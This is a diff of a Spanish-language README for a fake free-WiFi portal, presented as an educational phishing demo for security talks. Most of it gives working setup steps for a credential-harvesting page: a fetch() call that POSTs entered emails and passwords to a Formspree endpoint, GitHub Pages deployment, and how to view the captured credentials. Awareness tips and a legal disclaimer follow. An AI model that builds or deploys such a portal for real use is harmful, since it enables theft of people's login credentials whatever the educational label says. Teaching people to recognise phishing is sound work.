@@ -1,79 +1,110 @@
-# WiFi Phishing Attack - Proyecto Educativo
+# 📶 WiFi Gratis Principia - Proyecto Educativo de Phishing
 
-⚠️ **ADVERTENCIA**: Este proyecto es únicamente con fines educativos para demostrar técnicas de phishing. No usar con intenciones maliciosas.
+⚠️ **ADVERTENCIA IMPORTANTE**: Este proyecto es **únicamente con fines educativos** para demostrar técnicas de phishing en presentaciones de seguridad informática. El uso malicioso de estas técnicas es **ilegal**.
 
-## 📋 Descripción
+## 🎯 Descripción
 
-Página web de demostración que simula un portal de WiFi gratuito para educar sobre ataques de phishing.
+Página web de demostración que simula un portal de WiFi gratuito para educar sobre ataques de phishing y concienciar sobre seguridad informática.
 
-## 🔧 Configuración para Guardar Credenciales
+## 🚀 Configuración Rápida (5 minutos)
 
-Dado que GitHub Pages solo sirve archivos estáticos, necesitas un backend para guardar las credenciales. Aquí tienes varias opciones:
+### Opción 1: Formspree (Recomendado) ✅
 
-### Opción 1: Webhook.site (Más Rápido - Para Pruebas)
+**Formspree** es gratuito, confiable y no requiere backend. Gratis hasta 50 envíos/mes.
 
-1. Ve a https://webhook.site
-2. Copia la URL única que te dan
-3. En [index.html](index.html), reemplaza `TU_WEBHOOK_URL_AQUI` con esa URL
-4. Todas las credenciales aparecerán en tiempo real en webhook.site
+1. **Regístrate en Formspree**:
+   - Ve a https://formspree.io/
+   - Crea una cuenta gratis
+   - Crea un nuevo formulario
 
-**Ejemplo:**
-```javascript
-const webhookURL = 'https://webhook.site/tu-id-unico-aqui';
-```
+2. **Obtén tu endpoint**:
+   - Copia la URL que te dan (algo como `https://formspree.io/f/xyzabcde`)
 
-### Opción 2: Google Forms (Permanente y Gratis)
+3. **Configura en index.html**:
+   - Abre `index.html` en un editor
+   - Busca la línea: `const endpoint = 'TU_ENDPOINT_AQUI';`
+   - Reemplaza con tu URL de Formspree
+   - Descomenta las líneas de Formspree (quita los `//`)
 
-1. Crea un nuevo Google Form en https://forms.google.com
-2. Añade dos preguntas: "Email" y "Password"
-3. Obtén el enlace de envío del formulario
-4. Modifica el código para usar la API de Google Forms
+   ```javascript
+   // Dentro de la función enviarCredenciales(), reemplaza:
+   const response = await fetch('https://formspree.io/f/xyzabcde', {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify(datos)
+   });
+   ```
 
-### Opción 3: Formspree (Recomendado)
+4. **Verifica que funciona**:
+   - Abre `index.html` en tu navegador
+   - Haz clic en "Obtener WiFi Gratis"
+   - Introduce credenciales de prueba
+   - Ve a tu panel de Formspree para ver las credenciales capturadas
 
-1. Regístrate en https://formspree.io (gratis hasta 50 envíos/mes)
-2. Crea un nuevo formulario
-3. Copia la URL del endpoint
-4. Reemplaza en [index.html](index.html):
-```javascript
-const webhookURL = 'https://formspree.io/f/tu-id-aqui';
-```
+### Opción 2: Google Forms (Alternativa)
 
-### Opción 4: Servidor propio con Node.js
+1. Crea un Google Form con campos "email" y "password"
+2. Usa la URL de envío del formulario
+3. Adapta el código para enviar a Google Forms
 
-Si quieres alojar tu propio servidor:
+### Opción 3: Servicio propio (Avanzado)
 
-1. Despliega en servicios como Render, Railway o Vercel
-2. Crea un endpoint POST que guarde en un archivo o base de datos
-3. Actualiza la URL en [index.html](index.html)
+Si quieres tu propio servidor, consulta la documentación de despliegue con Node.js.
 
-## 📊 Ver las Credenciales Capturadas
+## 📱 Desplegar en GitHub Pages
 
-- **Webhook.site**: Ve directamente a tu URL única
-- **Formspree**: Revisa tu panel de control
-- **Google Forms**: Ve las respuestas en Google Sheets
-- **Servidor propio**: Accede a tu base de datos o archivo de logs
-
-## 🚀 Despliegue
-
-1. Haz commit de los cambios:
+1. **Haz commit de los cambios**:
 ```bash
-git add .
-git commit -m "Configurar captura de credenciales"
+git add index.html
+git commit -m "Configurar Formspree"
 git push origin main
 ```
 
-2. Ve a Settings > Pages en tu repositorio de GitHub
-3. Asegúrate de que GitHub Pages esté habilitado desde la rama `main`
+2. **Activa GitHub Pages**:
+   - Ve a Settings > Pages en tu repositorio
+   - Selecciona rama `main` como fuente
+   - Guarda los cambios
 
-## 📝 Uso en Presentación
+3. **Accede a tu página**:
+   - La URL será: `https://tu-usuario.github.io/wifi-phishing-attack`
+   - Puede tardar 1-5 minutos en estar disponible
 
-Durante tu presentación, puedes:
-1. Mostrar la página de phishing
-2. Ingresar credenciales de prueba
-3. Mostrar en tiempo real cómo se capturan en tu webhook/servicio
-4. Explicar las señales de advertencia del phishing
+## 🎓 Uso en Presentaciones
+
+Durante tu presentación de seguridad:
+
+1. **Abre la página** en un proyector/pantalla
+2. **Muestra el diseño** profesional del portal falso
+3. **Introduce credenciales de prueba** en vivo
+4. **Abre tu panel de Formspree** en otra pestaña
+5. **Muestra en tiempo real** cómo se capturaron las credenciales
+6. **Explica las señales de advertencia**:
+   - URL sospechosa
+   - Falta de HTTPS (candado)
+   - Solicitud inesperada de credenciales
+   - Diseño genérico
+
+## 🔒 Señales de Phishing a Enseñar
+
+- ✅ Verificar siempre la URL del sitio
+- ✅ Buscar el candado HTTPS
+- ✅ Desconfiar de ofertas "gratis" que piden credenciales
+- ✅ Usar autenticación de dos factores
+- ✅ No usar las mismas contraseñas en diferentes sitios
 
 ## ⚖️ Aviso Legal
 
-Este proyecto es solo para fines educativos. El uso malicioso de técnicas de phishing es ilegal. Úsalo solo en entornos controlados con permiso explícito.
+**Este proyecto es solo para fines educativos**. 
+
+- ✅ Usar en presentaciones educativas
+- ✅ Usar en entornos controlados con permiso
+- ✅ Enseñar a otros sobre seguridad
+- ❌ NO usar para capturar credenciales reales
+- ❌ NO usar sin consentimiento explícito
+- ❌ NO usar con intenciones maliciosas
+
+El uso malicioso de técnicas de phishing es **ilegal** y puede resultar en consecuencias legales graves.
+
+---
+
+**Desarrollado con fines educativos** | Seguridad Informática | 2026
